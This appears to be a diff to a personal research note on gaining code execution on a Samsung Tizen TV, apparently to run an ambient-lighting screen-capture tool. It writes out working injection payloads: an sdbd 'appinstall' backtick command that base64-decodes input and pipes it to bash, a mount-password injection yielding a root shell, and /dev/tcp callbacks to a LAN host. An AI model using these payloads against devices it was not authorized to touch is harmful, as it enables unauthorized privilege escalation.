@@ -16,6 +16,38 @@ A command injected in the password field runs as **`uid=0(root)`, context `Syste
 | Spaces in payload | become commas (mount `-o user=,pass=` rewrite) → payload cannot contain spaces |
 | `/dev/tcp/IP/PORT` | works (bash builtin) |
 | AppInstall/SDB `tpk` (SVE-2025-50109) | patched in fw 2301 — metacharacters rejected |
+| sdbd loopback `appinstall tpk` injection | **WORKS** — see below |
+
+## sdbd loopback injection (unprivileged exec — Vetro method)
+
+`sdbd` listens on `127.0.0.1:26101` (devIP=`127.0.0.1` authorizes the loopback host).
+External connections to `192.168.3.191:26101` are accepted at TCP level but reset
+after the `CNXN` — the daemon only honors `host::` handshakes from authorized hosts.
+
+**The eval vector** (works on fw 2301):
+
+```
+shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<b64>|base64${IFS}-d|bash`.tpk
+```
+
+- `appinstall` is one of the few services sdbd accepts (`exec:`/`shell:`/`vd_appinstall` don't eval)
+- Inside the backticks, `${IFS}` expands to space — so the payload `printf <b64> | base64 -d | bash` runs the base64-decoded command as a shell
+- Executes as **`uid=901(sdk)`, SMACK `System`** — not root, but enough to launch the capture chain
+- `setsid` detaches so the child survives the sdbd session (`;`/`&&` alone die with the connection)
+
+The injection chain that works:
+
+```sh
+setsid /usr/bin/dotnet /home/owner/share/WledAmbiPpi.exe 192.168.3.176 4048 -1 >/home/owner/share/tmp/sdk_tools/ppi_auto.log 2>&1
+```
+
+→ `dotnet` has SMACK exec label `User` → child captures `ppicapture` at ~60-90fps.
+
+**Gate detail:** wrap commands in `mkdir -p /tmp/s-<rand>` — a stale gate dir from an earlier
+injection made `&&` skip the command silently (randomize it).
+
+**Relevant helper:** `tools/sdpmemcs/SdbInject.exe v2:<shell-cmd>` builds the whole packet itself
+(handles base64+${IFS}+backticks so the bridge can't mangle them).
 
 ## Payload that worked
 
@@ -40,6 +72,15 @@ echo STAGE2-OK >/dev/tcp/192.168.3.200/9999
 3. TV: Remote PC → connect to `192.168.3.200` → toolbar → **Shared Folder**
 4. The mount evaluates the password → `STAGE2-OK` on 9999 → root shell on 9998
 5. Commands go through the 9997 control channel (the SMB session stays blocked — expected)
+
+## Privilege levels reachable
+
+| Mechanism | uid | SMACK | Root? | Needs click? |
+|---|---|---|---|---|
+| CIFS mount password eval (stage2) | 0 | System::Privileged | **yes** | 1 mount per boot |
+| sdbd `appinstall` backtick injection | 901(sdk) | System | no | needs a TV-side trigger |
+| `setsid /usr/bin/dotnet` child of injected cmd | 901 | **User** | no | — |
+| `launch_app` of a signed wgt service | app uid | User::Pkg::\<pkg\> | no | — |
 
 ## Root environment
 
